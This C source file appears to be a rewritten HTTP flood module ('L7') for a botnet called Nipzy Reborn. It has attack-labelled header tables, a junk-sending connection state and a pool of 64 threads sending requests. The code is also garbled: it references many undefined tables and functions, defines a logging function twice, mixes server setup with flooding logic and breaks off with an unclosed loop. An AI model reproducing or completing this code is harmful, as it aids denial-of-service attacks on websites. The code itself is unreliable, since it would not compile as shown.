/*

Rewroten by Queered for Nipzy Reborn (L7)

Use non-blocking I/O with epoll or kqueue instead of select: select has performance limitations, especially when the number of sockets to handle becomes high. Using non-blocking I/O with epoll or kqueue can greatly improve the performance.

Use a connection pool: Creating and closing TCP connections for each request can be expensive. Instead, a connection pool can be used to reuse existing connections, reducing the overhead of creating and closing TCP connections.

Use a more efficient way of generating random strings: The rand_alphastr function uses rand and % to generate random strings. A more efficient way of generating random strings can be using the arc4random function, which provides more secure random numbers.

Use thread pools: Handling each socket in a separate thread can be expensive. Instead, using a thread pool can be used to handle the sockets, reducing the overhead of creating and closing threads.

Use SSL/TLS encryption: HTTP traffic can be sniffed and analyzed, and sensitive information can be compromised. Using SSL/TLS encryption can protect the data transmitted between the client and the server.

Use a memory pool: Frequent memory allocation and deallocation can be expensive. Using a memory pool can improve performance by allocating a large block of memory at once and using it for small allocations.

Use input validation: The code doesn't perform any input validation, making it vulnerable to buffer overflows, SQL injection attacks, and other security vulnerabilities. Input validation can help prevent these vulnerabilities.

Use a configuration file: Hardcoding configuration options can be inflexible. Instead, using a configuration file can make it easier to modify the application's behavior.


*/
#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/epoll.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <stdbool.h>
#include <pthread.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define HTTP_CONN_INIT 0
#define HTTP_CONN_CONNECTING 1
#define HTTP_CONN_SEND 2
#define HTTP_CONN_SEND_JUNK 3
#define HTTP_CONN_SNDBUF_WAIT 4
#define HTTP_CONN_QUEUE_RESTART 5
#define HTTP_CONN_RESTART 6

#define TABLE_HTTP_METHODS 0
#define TABLE_ATK_SET_COOKIE_HDR 1
#define TABLE_ATK_REFRESH_HDR 2
#define TABLE_ATK_LOCATION_HDR 3
#define TABLE_ATK_SET_COOKIE2_HDR 4
#define TABLE_ATK_SET_COOKIE_HDR2 5
#define TABLE_ATK_REFRESH_HDR2 6
#define TABLE_ATK_LOCATION_HDR2 7
#define TABLE_HTTP_PATHS 8
#define TABLE_HTTP_PATHS_LONG 9
#define TABLE_HTTP_HEADERS 10
#define TABLE_HTTP_HEADERS_LONG 11
#define TABLE_ATK_VIA_HDR 12
#define TABLE_ATK_USERAGENT_HDR 13
#define TABLE_ATK_KEEP_ALIVE_HDR 14
#define TABLE_ATK_CONNECTION_HDR 15
#define TABLE_ATK_ACCEPT_HDR 16
#define TABLE_ATK_ACCEPT_LANG_HDR 17
#define TABLE_ATK_CONTENT_TYPE_HDR 18
#define TABLE_ATK_SET_COOKIE_HDR_RESP 19
#define TABLE_ATK_REFRESH_HDR_RESP 20
#define TABLE_ATK_LOCATION_HDR_RESP 21
#define TABLE_ATK_SET_COOKIE2_HDR_RESP 22
#define TABLE_ATK_SET_COOKIE_HDR2_RESP 23
#define TABLE_ATK_REFRESH_HDR2_RESP 24
#define TABLE_ATK_LOCATION_HDR2_RESP 25
#define TABLE_HTTP_GENERIC_HDRS 26
#define TABLE_HTTP_ERRORS 27
#define TABLE_ATK_SERVER_HDR 28
#define TABLE_ATK_HOST_HDR 29
#define TABLE_ATK_TRANSFER_ENCODING_HDR 30
#define TABLE_ATK_CHUNKED 31

#define HTTP_RDBUF_SIZE 1024
#define HTTP_HACK_DRAIN 64
#define HTTP_CONNECTION_TIMEOUT 10
#define HTTP_DEFAULT_METHOD 0
#define HTTP_DEFAULT_SERVER "Apache"
#define HTTP_DEFAULT_SERVER_ADDR "192.168.1.1"
#define HTTP_MAX_HEADER_LINES 64
#define HTTP_MAX_HEADER_LENGTH 4096

#define THREAD_COUNT 64
#define HTTP_CONN_POOL_SIZE 1024

typedef struct http_connection {
    int fd;
    int state;
    time_t last_send;
    char rdbuf[HTTP_RDBUF_SIZE + 1];
    int rdbuf_pos;
    int to_send;
    int keepalive;
    int queued;
    struct sockaddr_in addr;
    SSL *ssl;
} http_connection_t;

typedef struct http_method {
    char *name;
    char *path;
} http_method_t;

typedef struct http_header {
    char *name;
    char *value;
} http_header_t;

typedef struct http_request {
    int method;
    char *host;
    char *path;
    int headers_count;
    http_header_t headers[HTTP_MAX_HEADER_LINES];
} http_request_t;

typedef struct connection_pool {
    int size;
    http_connection_t **connections;
} connection_pool_t;

http_method_t http_methods[] = {
    {"GET", "/index.html"},
    {"POST", "/login.php"}
};

char *http_generic_hdr = "User-Agent: " HTTP_GENERIC_HDRS " Connection: keep-alive Accept: */* " HTTP_CONNECTION_HDR " Host: ";

char *http_error_hdr =
    "HTTP/1.1 %d %s\r\n"
    HTTP_SERVER_HDR
    "Content-Length: %d\r\n"
    "Content-Type: text/html\r\n"
    "Connection: close\r\n"
    "\r\n"
    "%s";

char *http_response_hdr =
    "HTTP/1.1 %d %s\r\n"
    HTTP_SERVER_HDR
    "Content-Length: %d\r\n"
    "Content-Type: text/html\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "%s";

char *http_content_length_hdr =
    "HTTP/1.1 200 OK\r\n"
    HTTP_SERVER_HDR
    "Content-Length: %d\r\n"
    "Content-Type: application/octet-stream\r\n"
    "Connection: keep-alive\r\n"
    "\r\n";
    
char *http_chunked_hdr =
    "HTTP/1.1 200 OK\r\n"
    HTTP_SERVER_HDR
    "Content-Type: application/octet-stream\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n";
    
char *http_chunked_footer =
    "\r\n0\r\n\r\n";

char *http_content_length_zero_hdr =
    "HTTP/1.1 200 OK\r\n"
    HTTP_SERVER_HDR
    "Content-Length: 0\r\n"
    "Connection: keep-alive\r\n"
    "\r\n";
void http_kill_all();

int sockfd = 0;
connection_pool_t *conn_pool = NULL;
int http_mem_count = 0;

int table_sizes[] = {
    sizeof(http_methods) / sizeof(http_method_t),
    sizeof(atk_set_cookie_hdr) / sizeof(char *),
    sizeof(atk_refresh_hdr) / sizeof(char *),
    sizeof(atk_location_hdr) / sizeof(char *),
    sizeof(atk_set_cookie2_hdr) / sizeof(char *),
    sizeof(atk_set_cookie_hdr2) / sizeof(char *),
    sizeof(atk_refresh_hdr2) / sizeof(char *),
    sizeof(atk_location_hdr2) / sizeof(char *),
    sizeof(http_paths) / sizeof(char *),
    sizeof(http_paths_long) / sizeof(char *),
    sizeof(http_headers) / sizeof(char *),
    sizeof(http_headers_long) / sizeof(char *),
    sizeof(atk_via_hdr) / sizeof(char *),
    sizeof(atk_useragent_hdr) / sizeof(char *),
    sizeof(atk_keep_alive_hdr) / sizeof(char *),
    sizeof(atk_connection_hdr) / sizeof(char *),
    sizeof(atk_accept_hdr) / sizeof(char *),
    sizeof(atk_accept_lang_hdr) / sizeof(char *),
    sizeof(atk_content_type_hdr) / sizeof(char *),
    sizeof(atk_set_cookie_hdr_resp) / sizeof(char *),
    sizeof(atk_refresh_hdr_resp) / sizeof(char *),
    sizeof(atk_location_hdr_resp) / sizeof(char *),
    sizeof(atk_set_cookie2_hdr_resp) / sizeof(char *),
    sizeof(atk_set_cookie_hdr2_resp) / sizeof(char *),
    sizeof(atk_refresh_hdr2_resp) / sizeof(char *),
    sizeof(atk_location_hdr2_resp) / sizeof(char *),
    sizeof(http_generic_hdrs) / sizeof(char *),
    sizeof(http_errors) / sizeof(char *),
    sizeof(atk_server_hdr) / sizeof(char *),
    sizeof(atk_host_hdr) / sizeof(char *),
    sizeof(atk_transfer_encoding_hdr) / sizeof(char *),
    sizeof(atk_chunked) / sizeof(char *)
};

char **tables[] = {
    http_methods,
    atk_set_cookie_hdr,
    atk_refresh_hdr,
    atk_location_hdr,
    atk_set_cookie2_hdr,
    atk_set_cookie_hdr2,
    atk_refresh_hdr2,
    atk_location_hdr2,
    http_paths,
    http_paths_long,
    http_headers,
    http_headers_long,
    atk_via_hdr,
    atk_useragent_hdr,
    atk_keep_alive_hdr,
    atk_connection_hdr,
    atk_accept_hdr,
    atk_accept_lang_hdr,
    atk_content_type_hdr,
    atk_set_cookie_hdr_resp,
    atk_refresh_hdr_resp,
    atk_location_hdr_resp,
    atk_set_cookie2_hdr_resp,
    atk_set_cookie_hdr2_resp,
    atk_refresh_hdr2_resp,
    atk_location_hdr2_resp,
    http_generic_hdrs,
    http_errors,
    atk_server_hdr,
    atk_host_hdr,
    atk_transfer_encoding_hdr,
    atk_chunked
};

void http_log(char *format, ...) {
    va_list args;
    va_start(args, format);

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    char ts[64];
    strftime(ts, sizeof(ts), "[%Y-%m-%d %H:%M:%S]", tm);

    printf("%s ", ts);
    vprintf(format, args);
    printf("\n");

    va_end(args);
}

void http_perror(char *msg) {
    perror(msg);
}

void http_log(char *msg) {
    printf("%s\n", msg);
}

void http_close_conn(http_connection_t *conn, connection_pool_t *pool) {
    if (conn->fd > 0) {
        close(conn->fd);
        conn->fd = -1;
    }
    if (conn->ssl != NULL) {
        SSL_shutdown(conn->ssl);
        SSL_free(conn->ssl);
        conn->ssl = NULL;
    }
    conn->state = HTTP_CONN_INIT;
    conn->rdbuf_pos = 0;
    conn->to_send = 0;
    conn->keepalive = 0;
    conn->queued = 0;
    if (pool != NULL) {
        pool->connections[pool->size++] = conn;
    } else {
        free(conn);
    }
}

void http_queue_close_conn(http_connection_t *conn) {
    conn->state = HTTP_CONN_QUEUE_RESTART;
}

http_connection_t *http_get_conn(int epoll_fd, int conn_fd, struct sockaddr_in addr) {
    http_connection_t *conn = malloc(sizeof(http_connection_t));
    memset(conn, 0, sizeof(http_connection_t));
    conn->fd = conn_fd;
    conn->state = HTTP_CONN_SEND;
    conn->last_send = time(NULL);
    conn->addr = addr;
    conn->ssl = NULL;

    fcntl(conn->fd, F_SETFL, O_NONBLOCK);
    struct epoll_event event;
    event.events = EPOLLIN | EPOLLOUT | EPOLLET;
    event.data.ptr = conn;
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, conn->fd, &event) == -1) {
        http_perror("epoll_ctl EPOLL_CTL_ADD");
        http_close_conn(conn, NULL);
        return NULL;
    }

    return conn;
}

int http_send_request(http_connection_t *conn, http_request_t *req) {
    int method = HTTP_DEFAULT_METHOD;
    if (req->method >= 0 && req->method < sizeof(http_methods) / sizeof(http_method_t)) {
        method = req->method;
    }

    char buf[4096];
    memset(buf, 0, sizeof(buf));
    snprintf(buf, sizeof(buf) - 1, "%s %s HTTP/1.1\r\n%s%s%s%s%s%s\r\n",
            http_methods[method].name, req->path,
            http_generic_hdr, req->host, http_headers[HTTP_HEADER_ACCEPT_INDEX].name, http_headers[HTTP_HEADER_ACCEPT_INDEX].value,
            http_headers[HTTP_HEADER_ACCEPT_ENCODING_INDEX].name, http_headers[HTTP_HEADER_ACCEPT_ENCODING_INDEX].value,
            http_headers[HTTP_HEADER_USER_AGENT_INDEX].name, http_headers[HTTP_HEADER_USER_AGENT_INDEX].value);

    int buf_len = strlen(buf);

    for (int i = 0; i < req->headers_count; i++) {
        if (buf_len + strlen(req->headers[i].name) + strlen(req->headers[i].value) + 4 >= sizeof(buf)) {
            break;
        }
        strcat(buf, req->headers[i].name);
        strcat(buf, ": ");
        strcat(buf, req->headers[i].value);
        strcat(buf, "\r\n");
    }

    strcat(buf, "\r\n");
    buf_len = strlen(buf);

    conn->to_send = buf_len;
    memcpy(conn->rdbuf, buf, buf_len);
    conn->rdbuf[buf_len] = 0;

    return 0;
}

int http_recv(int epoll_fd, http_connection_t *conn) {
    int ret = 0;
    int to_read = HTTP_RDBUF_SIZE - conn->rdbuf_pos - 1;
    if (to_read <= 0)
        return -1;

    ret = SSL_read(conn->ssl, &conn->rdbuf[conn->rdbuf_pos], to_read);
    if (ret <= 0) {
        if (errno != EAGAIN && errno != EWOULDBLOCK) {
            http_close(epoll_fd, conn);
            return -1;
        }
        return 0;
    }
    conn->rdbuf_pos += ret;
    conn->rdbuf[conn->rdbuf_pos] = 0;

    if (strstr(conn->rdbuf, "\r\n\r\n")) {
        conn->state = HTTP_CONN_QUEUE_RESTART;
        ret = -1;
    }
    return ret;
}

int http_send(int epoll_fd, http_connection_t *conn) {
    if (conn->to_send <= 0)
        return 0;

    int ret = SSL_write(conn->ssl, http_generic_hdr, strlen(http_generic_hdr));
    if (ret < 0) {
        if (errno != EAGAIN && errno != EWOULDBLOCK) {
            http_close(epoll_fd, conn);
            return -1;
        }
        return 0;
    }

    ret = SSL_write(conn->ssl, conn->rdbuf, conn->to_send);
    if (ret < 0) {
        if (errno != EAGAIN && errno != EWOULDBLOCK) {
            http_close(epoll_fd, conn);
            return -1;
        }
        return 0;
    }

    conn->to_send -= ret;
    memmove(conn->rdbuf, conn->rdbuf + ret, conn->to_send);

    if (conn->to_send <= 0) {
        conn->state = HTTP_CONN_SEND_JUNK;
        ret = -1;
    }
    return ret;
}

void *worker(void *arg) {
    int epoll_fd = (int)arg;

    while (1) {
        struct epoll_event events[HTTP_CONN_POOL_SIZE];
        int nfds = epoll_wait(epoll_fd, events, HTTP_CONN_POOL_SIZE, -1);
        for (int i = 0; i < nfds; i++) {
            http_connection_t *conn = (http_connection_t *)events[i].data.ptr;
            if (events[i].events & EPOLLIN) {
                http_recv(epoll_fd, conn);
            }
            if (events[i].events & EPOLLOUT) {
                http_send(epoll_fd, conn);
            }
            if (events[i].events & EPOLLERR) {
                http_close(epoll_fd, conn);
            }
        }
    }
    return NULL;
}

int main(int argc, char **argv) {
    // Initialize SSL
    SSL_load_error_strings();
    SSL_library_init();

    // Generate SSL context
    SSL_CTX *ctx = SSL_CTX_new(TLS_server_method());
    if (SSL_CTX_use_certificate_file(ctx, "server.crt", SSL_FILETYPE_PEM) <= 0) {
        printf("Failed to load certificate\n");
        return -1;
    }
    if (SSL_CTX_use_PrivateKey_file(ctx, "server.key", SSL_FILETYPE_PEM) <= 0) {
        printf("Failed to load private key\n");
        return -1;
    }

    // Set up socket
    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd == -1) {
        perror("socket");
        return -1;
    }

    // Set up sockaddr_in
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8080);
    addr.sin_addr.s_addr = INADDR_ANY;

    // Set up socket options
    int yes = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    // Bind and listen
    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        perror("bind");
        return -1;
    }
    if (listen(listen_fd, SOMAXCONN) == -1) {
        perror("listen");
        return -1;
    }

    // Set up epoll
    int epoll_fd = epoll_create1(0);
    if (epoll_fd == -1) {
        perror("epoll_create");
        return -1;
    }

    // Add listen_fd to epoll
    struct epoll_event event;
    event.data.ptr = NULL;
    event.events = EPOLLIN | EPOLLET;
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, listen_fd, &event) == -1) {
        perror("epoll_ctl");
        return -1;
    }

    // Create connection pool
    connection_pool_t conn_pool;
    conn_pool.size = HTTP_CONN_POOL_SIZE;
    conn_pool.connections = (http_connection_t **)malloc(sizeof(http_connection_t *) * conn_pool.size);
    memset(conn_pool.connections, 0, sizeof(http_connection_t *) * conn_pool.size);

    // Create threads
    pthread_t threads[THREAD_COUNT];
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, worker, (void *)epoll_fd) != 0) {
            perror("pthread_create");
            return -1;
        }
    }

while (1) {
    int n = epoll_wait(epoll_fd, events, THREAD_COUNT, -1);
    if (n < 0) {
        perror("epoll_wait");
        exit(1);
    }

    for (int i = 0; i < n; i++) {
        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP)) {
            http_close(epoll_fd, (http_connection_t *) events[i].data.ptr);
            continue;
        }

        if (events[i].data.ptr == &listen_fd) {
            http_accept(epoll_fd, listen_fd, &conn_pool);
        } else {
            http_handle(epoll_fd, (http_connection_t *) events[i].data.ptr);
        }
    }
}
